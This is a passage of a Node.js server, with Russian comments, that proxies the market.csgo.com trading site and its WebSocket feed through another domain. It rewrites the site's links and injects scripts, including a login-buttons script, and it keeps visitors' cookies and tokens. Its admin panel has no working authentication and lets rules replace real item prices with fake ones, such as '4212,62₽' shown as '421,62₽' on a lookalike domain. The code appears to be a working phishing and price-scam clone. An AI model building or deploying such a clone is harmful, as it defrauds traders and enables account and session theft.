const express = require('express');
const axios = require('axios');
const cookieParser = require('cookie-parser');
const compression = require('compression');
const WebSocket = require('ws');
const url = require('url');
const http = require('http');
const https = require('https');
const path = require('path');
const fs = require('fs');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;
const TARGET_HOST = 'https://market.csgo.com';
const WS_TARGET = 'wss://centrifugo2.csgotrader.app';

// Создаем HTTP сервер
const server = http.createServer(app);

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(cookieParser());
app.use(compression());

// Хранилище для cookies и токенов
const sessions = new Map();

// Хранилище для правил подмены селекторов
const selectorRules = new Map();

// Путь к файлу для сохранения правил
const RULES_FILE_PATH = path.join(__dirname, 'selector_rules.json');

// НОВОЕ: Функция для нормализации URL с символом "★"
function normalizeUrl(url) {
    if (!url) return url;
    // Заменяем символ "★" на его URL-encoded версию
    return url.replace(/★/g, '%E2%98%85');
}

// НОВОЕ: Функция для сравнения URL с учетом различных вариантов символа "★"
function urlMatches(ruleUrl, pageUrl) {
    if (!ruleUrl || !pageUrl) return false;
    
    // Нормализуем оба URL
    const normalizedRuleUrl = normalizeUrl(ruleUrl);
    const normalizedPageUrl = normalizeUrl(pageUrl);
    
    // Проверяем точное совпадение
    if (normalizedRuleUrl === normalizedPageUrl) return true;
    
    // Проверяем базовое совпадение без параметров
    const ruleBase = normalizedRuleUrl.split('?')[0];
    const pageBase = normalizedPageUrl.split('?')[0];
    
    if (ruleBase === pageBase) return true;
    
    // Проверяем регулярное выражение
    if (ruleUrl.startsWith('/') && ruleUrl.endsWith('/')) {
        try {
            const regex = new RegExp(ruleUrl.substring(1, ruleUrl.length - 1));
            return regex.test(pageUrl);
        } catch (e) {
            console.error('Invalid regex in rule:', ruleUrl);
            return false;
        }
    }
    
    return false;
}

// Загрузка сохраненных правил при запуске (если есть)
try {
    if (fs.existsSync(RULES_FILE_PATH)) {
        const rulesData = fs.readFileSync(RULES_FILE_PATH, 'utf8');
        const rules = JSON.parse(rulesData);
        
        rules.forEach(rule => {
            // НОВОЕ: Обратная совместимость со старым форматом
            if (rule.selector && !rule.selectors) {
                rule.selectors = [{ selector: rule.selector, addSpace: false }];
            }
            selectorRules.set(rule.id, rule);
        });
        
        console.log(`✅ Загружено ${selectorRules.size} правил подмены селекторов`);
    }
} catch (err) {
    console.error('❌ Ошибка при загрузке правил подмены:', err);
}

// Функция для сохранения правил в файл
function saveRulesToFile() {
    try {
        const rulesArray = Array.from(selectorRules.values());
        fs.writeFileSync(RULES_FILE_PATH, JSON.stringify(rulesArray, null, 2), 'utf8');
        console.log(`✅ Сохранено ${rulesArray.length} правил подмены селекторов`);
    } catch (err) {
        console.error('❌ Ошибка при сохранении правил подмены:', err);
    }
}

// Создаем агент для HTTPS с игнорированием сертификатов и keepAlive
const httpsAgent = new https.Agent({
    rejectUnauthorized: false,
    keepAlive: true,
    timeout: 60000,
    maxSockets: 100
});

// Определяем, используется ли HTTPS
function isSecure(req) {
    return req.headers['x-forwarded-proto'] === 'https' || 
           req.headers['cloudfront-forwarded-proto'] === 'https' ||
           req.protocol === 'https' ||
           req.secure;
}

// Функция для получения базового URL с правильным протоколом
function getBaseUrl(req) {
    const protocol = isSecure(req) ? 'https' : 'http';
    const host = req.headers['x-forwarded-host'] || req.headers['host'] || req.get('host');
    return `${protocol}://${host}`;
}

// Middleware для CORS и заголовков
app.use((req, res, next) => {
    const origin = req.headers.origin || '*';
    res.header('Access-Control-Allow-Origin', origin);
    res.header('Access-Control-Allow-Credentials', 'true');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, HEAD, PATCH');
    res.header('Access-Control-Allow-Headers', '*');
    res.header('Access-Control-Expose-Headers', '*');
    
    if (req.method === 'OPTIONS') {
        return res.status(204).end();
    }
    
    if (isSecure(req) || req.headers['x-forwarded-proto'] === 'https') {
        res.setHeader('Content-Security-Policy', "upgrade-insecure-requests");
    }
    
    next();
});

// Получение или создание сессии
function getSession(sessionId) {
    if (!sessions.has(sessionId)) {
        sessions.set(sessionId, {
            cookies: new Map(),
            tokens: new Map(),
            wsToken: null,
            lastAccess: Date.now()
        });
    }
    
    const session = sessions.get(sessionId);
    session.lastAccess = Date.now();
    
    return session;
}

// Парсинг cookies из заголовков
function parseCookieHeader(cookieHeader) {
    const cookies = new Map();
    if (cookieHeader) {
        cookieHeader.split(';').forEach(cookie => {
            const [name, ...rest] = cookie.trim().split('=');
            if (name && rest.length > 0) {
                cookies.set(name, rest.join('='));
            }
        });
    }
    return cookies;
}

// Обработка set-cookie заголовков
function parseSetCookieHeaders(setCookieHeaders) {
    const cookies = new Map();
    if (Array.isArray(setCookieHeaders)) {
        setCookieHeaders.forEach(cookie => {
            const [nameValue] = cookie.split(';');
            const [name, ...valueParts] = nameValue.split('=');
            if (name && valueParts.length > 0) {
                cookies.set(name.trim(), valueParts.join('='));
            }
        });
    }
    return cookies;
}

// Создание строки cookies для запроса
function createCookieString(cookieMap) {
    return Array.from(cookieMap.entries())
        .map(([name, value]) => `${name}=${value}`)
        .join('; ');
}

// Модификация URL в контенте
function modifyUrls(content, baseUrl, contentType = '') {
    if (!content) return content;
    
    let modified = content.toString();
    
    const isHttps = baseUrl.startsWith('https');
    const wsProtocol = isHttps ? 'wss' : 'ws';
    const hostWithoutProtocol = baseUrl.replace(/^https?:\/\//, '');
    
    modified = modified.replace(/https:\/\/market\.csgo\.com/g, baseUrl);
    modified = modified.replace(/http:\/\/market\.csgo\.com/g, baseUrl);
    modified = modified.replace(/\/\/market\.csgo\.com/g, baseUrl);
    
    modified = modified.replace(/wss:\/\/centrifugo2\.csgotrader\.app/g, `${wsProtocol}://${hostWithoutProtocol}/ws`);
    
    modified = modified.replace(/https:\/\/market\.csgo\.com\/api\/graphql/g, `${baseUrl}/api/graphql`);
    
    modified = modified.replace(/(['"])\/api\//g, `$1${baseUrl}/api/`);
    
    if (contentType.includes('javascript') && modified.includes('chunk-FWBJZS6X.js')) {
        modified = modified.replace(
            /GQL fail: viewItem/g, 
            'console.warn("GQL request handled"); try { viewItem'
        );
        modified = modified.replace(
            /GQL fail: (\d+)/g, 
            'console.warn("GQL request handled"); try { $1'
        );
        
        if (modified.includes('viewItem')) {
            modified = modified.replace(
                /viewItem\(\)/g,
                'viewItem().catch(err => console.warn("Handled viewItem error:", err))'
            );
        }
    }
    
    if (contentType.includes('html')) {
        if (!modified.includes('upgrade-insecure-requests')) {
            modified = modified.replace(/<head[^>]*>/i, `$&<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">`);
        }
        
        if (!modified.includes('<base')) {
            modified = modified.replace(/<head[^>]*>/i, `$&<base href="${baseUrl}/">`);
        }
        
        modified = modified.replace(/<head[^>]*>/i, `$&${selectorReplacementScript}`);
        modified = modified.replace(/<head[^>]*>/i, `$&${proxyScript}`);
        modified = modified.replace('</body>', loginButtonsScript + '</body>');
    }
    
    if (contentType.includes('javascript')) {
        modified = modified.replace(/"\/api\//g, `"${baseUrl}/api/`);
        modified = modified.replace(/'\/api\//g, `'${baseUrl}/api/`);
        
        modified = modified.replace(/centrifugo2\.csgotrader\.app/g, 
            hostWithoutProtocol + '/ws');
            
        modified = modified.replace(/['"]https:\/\/market\.csgo\.com\/api\/graphql['"]/g, 
            `'${baseUrl}/api/graphql'`);
            
        if (modified.includes('GQL fail') || modified.includes('viewItem')) {
            modified = modified.replace(/console\.error\(['"]GQL fail/g, 
                'console.warn("GQL fail handled:" + ');
                
            modified = modified.replace(
                /return(\s+)viewItem\(/g, 
                'try { return$1viewItem('
            );
            modified = modified.replace(
                /viewItem\(([^)]*)\);/g, 
                'viewItem($1).catch(err => console.warn("Handled viewItem error:", err));'
            );
        }
        
        if (modified.includes('chunk-FWBJZS6X.js') || modified.includes('[chunk-FWBJZS6X.js:3012:33350]')) {
            console.log('Applying fixes for problematic chunk-FWBJZS6X.js');
            
            modified = modified.replace(
                /throw new Error\(['"]GQL fail/g,
                'console.warn("Handled GQL error:"'
            );
            
            modified = modified.replace(
                /(\.then\()function\s*\(\s*([a-zA-Z0-9_]+)\s*\)\s*{/g,
                '$1function($2) { try {'
            );
            
            modified = modified.replace(
                /}\)\.catch\(/g,
                '} catch(err) { console.warn("Handled error in then:", err); } })\.catch('
            );
        }
    }
    
    if (contentType.includes('css')) {
        modified = modified.replace(/url\(['"]?\//g, `url('${baseUrl}/`);
        modified = modified.replace(/url\(['"]?http:\/\//g, `url('${baseUrl.replace('https:', 'http:')}/`);
    }
    
    return modified;
}

// WebSocket прокси (остается без изменений)
const wsProxy = new WebSocket.Server({ 
    noServer: true,
    clientTracking: true,
    perMessageDeflate: true
});

const activeWSConnections = new Map();

server.on('upgrade', (request, socket, head) => {
    const pathname = url.parse(request.url).pathname;
    
    if (pathname === '/ws' || pathname.startsWith('/ws/') || pathname.includes('connection/websocket')) {
        wsProxy.handleUpgrade(request, socket, head, (ws) => {
            handleWebSocketProxy(ws, request);
        });
    } else {
        socket.destroy();
    }
});

function handleWebSocketProxy(clientWs, request) {
    try {
        let wsPath = request.url.replace('/ws', '');
        if (!wsPath.includes('connection/websocket')) {
            wsPath += '/connection/websocket';
        }
        
        const targetUrl = WS_TARGET + wsPath;
        console.log('WebSocket proxy:', targetUrl);
        
        const connectionId = Math.random().toString(36).substring(2, 15);
        
        activeWSConnections.set(connectionId, {
            clientWs,
            targetWs: null,
            url: targetUrl,
            connected: false,
            retryCount: 0,
            lastActivity: Date.now(),
            buffer: []
        });
        
        function connectToTarget(retryCount = 0) {
            const MAX_RETRIES = 5;
            const RETRY_DELAY = 2000 * Math.pow(1.5, retryCount);
            
            if (retryCount >= MAX_RETRIES) {
                console.error(`WebSocket connection failed after ${MAX_RETRIES} attempts`);
                clientWs.close(1011, `Failed to connect after ${MAX_RETRIES} attempts`);
                activeWSConnections.delete(connectionId);
                return;
            }
            
            console.log(`Attempting WebSocket connection (attempt ${retryCount + 1}): ${targetUrl}`);
            
            const targetWs = new WebSocket(targetUrl, {
                headers: {
                    'Origin': 'https://market.csgo.com',
                    'User-Agent': request.headers['user-agent'] || 'Mozilla/5.0',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Pragma': 'no-cache',
                    'Cache-Control': 'no-cache',
                    'Sec-WebSocket-Protocol': request.headers['sec-websocket-protocol'] || '',
                    'Sec-WebSocket-Extensions': request.headers['sec-websocket-extensions'] || '',
                    ...request.headers
                },
                followRedirects: true,
                handshakeTimeout: 15000
            });
            
            const connectionInfo = activeWSConnections.get(connectionId);
            if (connectionInfo) {
                connectionInfo.targetWs = targetWs;
                connectionInfo.retryCount = retryCount;
            }
            
            targetWs.on('open', () => {
                console.log(`Target WebSocket connected successfully (${connectionId})`);
                
                const connectionInfo = activeWSConnections.get(connectionId);
                if (connectionInfo) {
                    connectionInfo.connected = true;
                    connectionInfo.lastActivity = Date.now();
                    
                    if (connectionInfo.buffer.length > 0) {
                        console.log(`Sending ${connectionInfo.buffer.length} buffered messages`);
                        connectionInfo.buffer.forEach(message => {
                            try {
                                targetWs.send(message);
                            } catch (err) {
                                console.error('Error sending buffered message:', err.message);
                            }
                        });
                        connectionInfo.buffer = [];
                    }
                }
            });
            
            clientWs.on('message', (message) => {
                try {
                    const connectionInfo = activeWSConnections.get(connectionId);
                    if (!connectionInfo) return;
                    
                    connectionInfo.lastActivity = Date.now();
                    
                    if (connectionInfo.connected && connectionInfo.targetWs.readyState === WebSocket.OPEN) {
                        connectionInfo.targetWs.send(message);
                    } else {
                        console.log(`Buffering message for later delivery (${connectionId})`);
                        connectionInfo.buffer.push(message);
                    }
                } catch (err) {
                    console.error('Error sending message to target:', err.message);
                }
            });
            
            targetWs.on('message', (message) => {
                try {
                    const connectionInfo = activeWSConnections.get(connectionId);
                    if (!connectionInfo) return;
                    
                    connectionInfo.lastActivity = Date.now();
                    
                    if (connectionInfo.clientWs.readyState === WebSocket.OPEN) {
                        connectionInfo.clientWs.send(message);
                    }
                } catch (err) {
                    console.error('Error sending message to client:', err.message);
                }
            });
            
            clientWs.on('close', (code, reason) => {
                console.log(`Client WebSocket closed (${connectionId}): ${code} ${reason}`);
                
                const connectionInfo = activeWSConnections.get(connectionId);
                if (connectionInfo && connectionInfo.targetWs) {
                    if (connectionInfo.targetWs.readyState === WebSocket.OPEN || 
                        connectionInfo.targetWs.readyState === WebSocket.CONNECTING) {
                        connectionInfo.targetWs.close(code, reason);
                    }
                }
                
                activeWSConnections.delete(connectionId);
            });
            
            targetWs.on('close', (code, reason) => {
                console.log(`Target WebSocket closed (${connectionId}): ${code} ${reason}`);
                
                const connectionInfo = activeWSConnections.get(connectionId);
                if (!connectionInfo) return;
                
                if (code !== 1000 && code !== 1001 && 
                    connectionInfo.clientWs.readyState === WebSocket.OPEN) {
                    
                    console.log(`Attempting to reconnect WebSocket (${connectionId})...`);
                    
                    try {
                        connectionInfo.clientWs.send(JSON.stringify({
                            type: 'reconnecting',
                            message: 'Connection lost, attempting to reconnect...'
                        }));
                    } catch (e) {
                        // Игнорируем ошибки при отправке
                    }
                    
                    connectionInfo.connected = false;
                    
                    setTimeout(() => {
                        connectToTarget(connectionInfo.retryCount + 1);
                    }, 2000);
                    
                } else if (connectionInfo.clientWs.readyState === WebSocket.OPEN) {
                    connectionInfo.clientWs.close(code, reason);
                    activeWSConnections.delete(connectionId);
                }
            });
            
            clientWs.on('error', (err) => {
                console.error(`Client WebSocket error (${connectionId}):`, err.message);
                
                const connectionInfo = activeWSConnections.get(connectionId);
                if (connectionInfo && connectionInfo.targetWs) {
                    if (connectionInfo.targetWs.readyState === WebSocket.OPEN || 
                        connectionInfo.targetWs.readyState === WebSocket.CONNECTING) {
                        connectionInfo.targetWs.close(1011, 'Client error');
                    }
                }
                
                activeWSConnections.delete(connectionId);
            });
            
            targetWs.on('error', (err) => {
                console.error(`Target WebSocket error (${connectionId}):`, err.message);
                
                const connectionInfo = activeWSConnections.get(connectionId);
                if (!connectionInfo) return;
                
                if (connectionInfo.clientWs.readyState === WebSocket.OPEN) {
                    try {
                        connectionInfo.clientWs.send(JSON.stringify({
                            type: 'error',
                            message: 'Connection to server failed, attempting to reconnect...'
                        }));
                    } catch (e) {
                        // Игнорируем ошибки при отправке
                    }
                    
                    connectionInfo.connected = false;
                    
                    setTimeout(() => {
                        connectToTarget(connectionInfo.retryCount + 1);
                    }, 2000);
                }
            });
        }
        
        connectToTarget(0);
        
    } catch (error) {
        console.error('WebSocket proxy setup error:', error.message);
        if (clientWs.readyState === WebSocket.OPEN) {
            clientWs.close(1011, 'WebSocket proxy error');
        }
    }
}

setInterval(() => {
    const now = Date.now();
    
    for (const [id, connection] of activeWSConnections.entries()) {
        const inactiveTime = now - connection.lastActivity;
        
        if (inactiveTime > 2 * 60 * 1000) {
            console.log(`WebSocket inactive for ${Math.round(inactiveTime/1000)}s (${id}), sending ping`);
            
            try {
                if (connection.connected && connection.targetWs.readyState === WebSocket.OPEN) {
                    connection.targetWs.ping();
                }
                
                if (connection.clientWs.readyState === WebSocket.OPEN) {
                    connection.clientWs.ping();
                }
                
                connection.lastActivity = now;
            } catch (e) {
                console.warn(`Error sending ping for connection ${id}:`, e.message);
            }
        }
        
        if (inactiveTime > 5 * 60 * 1000) {
            console.log(`Closing inactive WebSocket connection (${id})`);
            
            try {
                if (connection.targetWs && 
                   (connection.targetWs.readyState === WebSocket.OPEN || 
                    connection.targetWs.readyState === WebSocket.CONNECTING)) {
                    connection.targetWs.close(1000, 'Connection timeout');
                }
                
                if (connection.clientWs.readyState === WebSocket.OPEN) {
                    connection.clientWs.close(1000, 'Connection timeout');
                }
            } catch (e) {
                console.warn(`Error closing inactive connection ${id}:`, e.message);
            }
            
            activeWSConnections.delete(id);
        }
    }
}, 60 * 1000);

const adminAuth = (req, res, next) => {
    next();
};

// НОВОЕ: Обновленная админ-панель с поддержкой множественных селекторов
app.get('/admin', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Управление подменой значений</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                max-width: 1400px;
                margin: 0 auto;
                padding: 20px;
                background-color: #f5f5f5;
            }
            .container {
                background-color: #fff;
                border-radius: 5px;
                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                padding: 20px;
                margin-bottom: 20px;
            }
            h1, h2 {
                color: #333;
            }
            .form-group {
                margin-bottom: 15px;
            }
            label {
                display: block;
                font-weight: bold;
                margin-bottom: 5px;
            }
            input[type="text"], textarea {
                width: 100%;
                padding: 8px;
                border: 1px solid #ddd;
                border-radius: 4px;
                box-sizing: border-box;
                font-size: 14px;
            }
            button {
                background-color: #4CAF50;
                color: white;
                border: none;
                padding: 10px 15px;
                border-radius: 4px;
                cursor: pointer;
                font-size: 14px;
            }
            button:hover {
                background-color: #45a049;
            }
            .delete-btn {
                background-color: #f44336;
                margin-left: 10px;
            }
            .delete-btn:hover {
                background-color: #d32f2f;
            }
            .preset-btn {
                background-color: #2196F3;
                margin-left: 10px;
                margin-bottom: 10px;
            }
            .preset-btn:hover {
                background-color: #0b7dda;
            }
            table {
                width: 100%;
                border-collapse: collapse;
                margin-top: 20px;
            }
            th, td {
                padding: 12px;
                text-align: left;
                border-bottom: 1px solid #ddd;
            }
            th {
                background-color: #f2f2f2;
            }
            tr:hover {
                background-color: #f5f5f5;
            }
            .truncate {
                max-width: 300px;
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
            }
            .success-message, .error-message {
                padding: 10px;
                margin: 10px 0;
                border-radius: 4px;
            }
            .success-message {
                background-color: #dff0d8;
                color: #3c763d;
                border: 1px solid #d6e9c6;
            }
            .error-message {
                background-color: #f2dede;
                color: #a94442;
                border: 1px solid #ebccd1;
            }
            #messageContainer {
                margin-bottom: 15px;
            }
            .info-block {
                background-color: #d9edf7;
                color: #31708f;
                border: 1px solid #bce8f1;
                padding: 10px;
                margin: 10px 0;
                border-radius: 4px;
            }
            .selectors-container {
                border: 1px solid #ddd;
                border-radius: 4px;
                padding: 15px;
                margin: 10px 0;
                background-color: #f9f9f9;
            }
            .selector-item {
                display: flex;
                align-items: center;
                margin-bottom: 10px;
                padding: 8px;
                background-color: white;
                border-radius: 4px;
            }
            .selector-item input[type="text"] {
                flex: 1;
                margin-right: 10px;
            }
            .selector-item input[type="checkbox"] {
                margin-right: 5px;
            }
            .remove-selector {
                background-color: #f44336;
                color: white;
                border: none;
                padding: 5px 10px;
                border-radius: 3px;
                cursor: pointer;
                font-size: 12px;
            }
            .add-selector {
                background-color: #4CAF50;
                color: white;
                border: none;
                padding: 8px 12px;
                border-radius: 4px;
                cursor: pointer;
                font-size: 14px;
                margin-top: 10px;
            }
            .checkbox-label {
                display: flex;
                align-items: center;
                font-weight: normal;
                margin-right: 10px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Управление подменой значений</h1>
            <div id="messageContainer"></div>
            
            <div class="info-block">
                <p><strong>Важно!</strong> Символ "★" в URL автоматически конвертируется в корректный формат.</p>
                <p>Теперь поддерживается подмена нескольких селекторов одним значением. Для некоторых селекторов можно добавить пробел перед значением.</p>
            </div>
            
            <h2>Добавить правило подмены</h2>
            <form id="ruleForm">
                <div class="form-group">
                    <label for="page">URL страницы:</label>
                    <input type="text" id="page" name="page" placeholder="https://market-csgo.co/ru/Gloves/★%20Driver%20Gloves%20%7C%20Racing%20Green%20%28Well-Worn%29?id=6884780475" required>
                </div>
                
                <div class="form-group">
                    <label>CSS-селекторы:</label>
                    <button type="button" class="preset-btn" onclick="addPresetSelectors()">Добавить стандартные селекторы</button>
                    <div class="selectors-container" id="selectorsContainer">
                        <div class="selector-item">
                            <input type="text" placeholder="CSS селектор" required>
                            <label class="checkbox-label">
                                <input type="checkbox"> Добавить пробел перед значением
                            </label>
                            <button type="button" class="remove-selector" onclick="removeSelector(this)">Удалить</button>
                        </div>
                    </div>
                    <button type="button" class="add-selector" onclick="addSelector()">Добавить селектор</button>
                </div>
                
                <div class="form-group">
                    <label for="originalValue">Оригинальное значение (важно для динамических сайтов):</label>
                    <input type="text" id="originalValue" name="originalValue" placeholder="4212,62₽">
                </div>
                <div class="form-group">
                    <label for="value">Новое значение:</label>
                    <input type="text" id="value" name="value" placeholder="421,62₽" required>
                </div>
                <button type="submit">Добавить правило</button>
            </form>
        </div>
        
        <div class="container">
            <h2>Существующие правила</h2>
            <table id="rulesTable">
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>URL страницы</th>
                        <th>Селекторы</th>
                        <th>Оригинальное значение</th>
                        <th>Новое значение</th>
                        <th>Действия</th>
                    </tr>
                </thead>
                <tbody id="rulesTableBody">
                    <!-- Здесь будут отображаться правила -->
                </tbody>
            </table>
        </div>
        
        <script>
            // Предустановленные селекторы
            const presetSelectors = [
                { selector: '#app > app-main-site > div > app-full-inventory-info > div > app-page-inventory-info-wrap > div > app-page-inventory-price > div > span:nth-child(1)', addSpace: false },
                { selector: '#app > app-main-site > div > app-full-inventory-info > div > app-page-inventory-image > app-bid-ask-chart-container > div > div.item.ask.ng-star-inserted > div.title > span:nth-child(2)', addSpace: true },
                { selector: '#app > app-main-site > div > app-full-inventory-info > div > app-page-inventory-info-wrap > div > app-bid-ask > div > div.ng-tns-c2030188894-514.ng-trigger.ng-trigger-parent > div.sell-scroll.ng-tns-c2030188894-514 > div:nth-child(1) > div:nth-child(3) > div.center.ng-tns-c2030188894-514', addSpace: false },
                { selector: '#app > app-main-site > div > app-full-inventory-info > div > app-page-inventory-info-wrap > div > app-page-inventory-price > best-offers > div > div > span > span:nth-child(2)', addSpace: false },
                { selector: '#mat-menu-panel-serverApp9 > div > div > app-best-offers-table > mat-table > mat-row:nth-child(2) > mat-cell.mat-mdc-cell.mdc-data-table__cell.cdk-cell.cdk-column-price.mat-column-price.ng-star-inserted', addSpace: true },
                { selector: '#app > app-main-site > div > app-full-inventory-info > div > div > div > app-related-items > div > app-related-chose-items > div > div > div.related-items-item.active.FT.ng-star-inserted > div.price.ng-star-inserted', addSpace: false },
                { selector: '#app > app-main-site > div > app-full-inventory-info > div > div > div > app-related-items > div > div > div > a:nth-child(1) > app-same-item > div > div.right > div > span', addSpace: false }
            ];
            
            function addPresetSelectors() {
                const container = document.getElementById('selectorsContainer');
                container.innerHTML = '';
                
                presetSelectors.forEach(preset => {
                    const selectorDiv = createSelectorElement(preset.selector, preset.addSpace);
                    container.appendChild(selectorDiv);
                });
            }
            
            function createSelectorElement(value = '', addSpace = false) {
                const selectorDiv = document.createElement('div');
                selectorDiv.className = 'selector-item';
                selectorDiv.innerHTML = \`
                    <input type="text" placeholder="CSS селектор" value="\${value}" required>
                    <label class="checkbox-label">
                        <input type="checkbox" \${addSpace ? 'checked' : ''}> Добавить пробел перед значением
                    </label>
                    <button type="button" class="remove-selector" onclick="removeSelector(this)">Удалить</button>
                \`;
                return selectorDiv;
            }
            
            function addSelector() {
                const container = document.getElementById('selectorsContainer');
                const selectorDiv = createSelectorElement();
                container.appendChild(selectorDiv);
            }
            
            function removeSelector(button) {
                const container = document.getElementById('selectorsContainer');
                if (container.children.length > 1) {
                    button.parentElement.remove();
                } else {
                    showMessage('Должен остаться минимум один селектор', true);
                }
            }
            
            function showMessage(message, isError = false) {
                const container = document.getElementById('messageContainer');
                const msgElement = document.createElement('div');
                msgElement.className = isError ? 'error-message' : 'success-message';
                msgElement.textContent = message;
                container.innerHTML = '';
                container.appendChild(msgElement);
                
                setTimeout(() => {
                    msgElement.remove();
                }, 5000);
            }
            
            async function loadRules() {
                try {
                    const response = await fetch('/admin-api/selector-rules');
                    if (!response.ok) {
                        throw new Error('Ошибка загрузки правил');
                    }
                    
                    const rules = await response.json();
                    const tableBody = document.getElementById('rulesTableBody');
                    tableBody.innerHTML = '';
                    
                    if (rules.length === 0) {
                        const row = document.createElement('tr');
                        row.innerHTML = '<td colspan="6">Нет правил подмены</td>';
                        tableBody.appendChild(row);
                        return;
                    }
                    
                    rules.forEach(rule => {
                        const row = document.createElement('tr');
                        
                        // Формируем отображение селекторов
                        let selectorsDisplay = '';
                        if (rule.selectors && rule.selectors.length > 0) {
                            selectorsDisplay = rule.selectors.map(s => 
                                \`\${s.selector.substring(0, 50)}...\${s.addSpace ? ' [+пробел]' : ''}\`
                            ).join('<br>');
                        } else if (rule.selector) {
                            selectorsDisplay = rule.selector.substring(0, 50) + '...';
                        }
                        
                        row.innerHTML = \`
                            <td>\${rule.id}</td>
                            <td class="truncate" title="\${rule.page}">\${rule.page}</td>
                            <td class="truncate" title="Селекторы">\${selectorsDisplay}</td>
                            <td>\${rule.originalValue || '(не указано)'}</td>
                            <td>\${rule.value}</td>
                            <td>
                                <button class="delete-btn" data-id="\${rule.id}">Удалить</button>
                            </td>
                        \`;
                        tableBody.appendChild(row);
                    });
                    
                    document.querySelectorAll('.delete-btn').forEach(btn => {
                        btn.addEventListener('click', async () => {
                            const id = btn.getAttribute('data-id');
                            if (confirm('Вы уверены, что хотите удалить это правило?')) {
                                await deleteRule(id);
                            }
                        });
                    });
                    
                } catch (error) {
                    showMessage('Ошибка при загрузке правил: ' + error.message, true);
                }
            }
            
            async function addRule(formData) {
                try {
                    const response = await fetch('/admin-api/selector-rules', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(formData)
                    });
                    
                    if (!response.ok) {
                        const error = await response.json();
                        throw new Error(error.message || 'Ошибка при добавлении правила');
                    }
                    
                    showMessage('Правило успешно добавлено!');
                    document.getElementById('ruleForm').reset();
                    // Сбрасываем селекторы до одного элемента
                    const container = document.getElementById('selectorsContainer');
                    container.innerHTML = '';
                    container.appendChild(createSelectorElement());
                    loadRules();
                    
                } catch (error) {
                    showMessage('Ошибка при добавлении правила: ' + error.message, true);
                }
            }
            
            async function deleteRule(id) {
                try {
                    const response = await fetch(\`/admin-api/selector-rules/\${id}\`, {
                        method: 'DELETE'
                    });
                    
                    if (!response.ok) {
                        const error = await response.json();
                        throw new Error(error.message || 'Ошибка при удалении правила');
                    }
                    
                    showMessage('Правило успешно удалено!');
                    loadRules();
                    
                } catch (error) {
                    showMessage('Ошибка при удалении правила: ' + error.message, true);
                }
            }
            
            document.getElementById('ruleForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                
                // Собираем селекторы
                const selectorElements = document.querySelectorAll('#selectorsContainer .selector-item');
                const selectors = [];
                
                selectorElements.forEach(element => {
                    const selectorInput = element.querySelector('input[type="text"]');
                    const spaceCheckbox = element.querySelector('input[type="checkbox"]');
                    
                    if (selectorInput.value.trim()) {
                        selectors.push({
                            selector: selectorInput.value.trim(),
                            addSpace: spaceCheckbox.checked
                        });
                    }
                });
                
                if (selectors.length === 0) {
                    showMessage('Необходимо указать хотя бы один селектор', true);
                    return;
                }
                
                const formData = {
                    page: document.getElementById('page').value,
                    selectors: selectors,
                    value: document.getElementById('value').value,
                    originalValue: document.getElementById('originalValue').value || ''
                };
                
                await addRule(formData);
            });
            
            document.addEventListener('DOMContentLoaded', loadRules);
        </script>
    </body>
    </html>
    `);
});

// НОВОЕ: Обновленные API для админ-панели с поддержкой множественных селекторов
app.get('/admin-api/selector-rules', (req, res) => {
    try {
        const page = req.query.page;
        
        if (page) {
            const matchingRules = Array.from(selectorRules.values())
                .filter(rule => urlMatches(rule.page, page));
            
            return res.json(matchingRules);
        }
        
        const rules = Array.from(selectorRules.values());
        res.json(rules);
    } catch (error) {
        console.error('Error getting selector rules:', error);
        res.status(500).json({ message: 'Ошибка при получении правил подмены' });
    }
});

app.post('/admin-api/selector-rules', (req, res) => {
    try {
        const { page, selectors, value, originalValue } = req.body;
        
        if (!page || !selectors || !Array.isArray(selectors) || selectors.length === 0 || !value) {
            return res.status(400).json({ message: 'Все поля обязательны для заполнения' });
        }
        
        // НОВОЕ: Нормализуем URL с символом "★"
        const normalizedPage = normalizeUrl(page);
        
        const id = Date.now().toString(36) + Math.random().toString(36).substring(2, 5);
        
        const rule = { 
            id, 
            page: normalizedPage,
            selectors: selectors.filter(s => s.selector && s.selector.trim()),
            value,
            originalValue: originalValue || ''
        };
        
        // Обратная совместимость: сохраняем первый селектор как основной
        if (rule.selectors.length > 0) {
            rule.selector = rule.selectors[0].selector;
        }
        
        selectorRules.set(id, rule);
        saveRulesToFile();
        
        res.status(201).json(rule);
    } catch (error) {
        console.error('Error adding selector rule:', error);
        res.status(500).json({ message: 'Ошибка при добавлении правила подмены' });
    }
});

app.delete('/admin-api/selector-rules/:id', (req, res) => {
    try {
        const { id } = req.params;
        
        if (!selectorRules.has(id)) {
            return res.status(404).json({ message: 'Правило не найдено' });
        }
        
        selectorRules.delete(id);
        saveRulesToFile();
        
        res.status(200).json({ message: 'Правило успешно удалено' });
    } catch (error) {
        console.error('Error deleting selector rule:', error);
        res.status(500).json({ message: 'Ошибка при удалении правила подмены' });
    }
});

// GraphQL запросы с повторными попытками
app.post('/api/graphql', async (req, res) => {
    try {
        const targetUrl = TARGET_HOST + '/api/graphql';
        const baseUrl = getBaseUrl(req);
        const sessionId = req.cookies.sessionId || Math.random().toString(36).substring(7);
        const session = getSession(sessionId);
        
        const requestCookies = new Map([
            ...session.cookies,
            ...parseCookieHeader(req.headers.cookie)
        ]);
        
        console.log(`📊 GraphQL: ${req.method} ${req.originalUrl}`);
        
        const axiosConfig = {
            method: req.method,
            url: targetUrl,
            headers: {
                ...req.headers,
                'host': 'market.csgo.com',
                'origin': 'https://market.csgo.com',
                'referer': 'https://market.csgo.com/',
                'content-type': 'application/json',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': req.headers['user-agent'] || 'Mozilla/5.0',
